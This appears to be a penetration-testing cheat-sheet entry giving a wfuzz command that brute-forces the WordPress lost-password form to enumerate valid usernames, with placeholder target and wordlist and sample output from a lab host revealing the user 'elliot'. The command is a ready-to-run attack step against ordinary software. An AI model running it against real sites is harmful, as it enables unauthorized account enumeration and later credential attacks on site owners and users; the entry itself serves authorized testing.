---
id: 8f7a9ebd-15fd-4025-b61c-80c172483c6b
name: wfuzz Brute Force a HTTP POST Form
type: command
executor: bash
data: wfuzz --hc 200 -w $_USERS.txt -u 'http://$_TARGET_IP/wp-login.php?action=lostpassword'
  -d '$_POST_DATA'
output: 'root@kali:~# wfuzz --hc 200 -c -w names.txt -u ''http://10.10.10.10/wp-login.php?action=lostpassword''
  -d ''user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password''


  ********************************************************

  * Wfuzz 2.4 - The Web Fuzzer                           *

  ********************************************************


  Target: http://10.10.10.10/wp-login.php?action=lostpassword

  Total requests: 10163


  ===================================================================

  ID           Response   Lines    Word     Chars       Payload

  ===================================================================


  000002955:   500        110 L    305 W    3068 Ch     "elliot"


  Total time: 184.0298

  Processed Requests: 10163

  Filtered Requests: 1016'
created_at: '2019-12-04T23:27:07.447960+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# wfuzz Brute Force a HTTP POST Form

```bash
wfuzz --hc 200 -w $_USERS.txt -u 'http://$_TARGET_IP/wp-login.php?action=lostpassword' -d '$_POST_DATA'
```

## Expected Output

```
root@kali:~# wfuzz --hc 200 -c -w names.txt -u 'http://10.10.10.10/wp-login.php?action=lostpassword' -d 'user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password'

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.10/wp-login.php?action=lostpassword
Total requests: 10163

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002955:   500        110 L    305 W    3068 Ch     "elliot"

Total time: 184.0298
Processed Requests: 10163
Filtered Requests: 1016
```


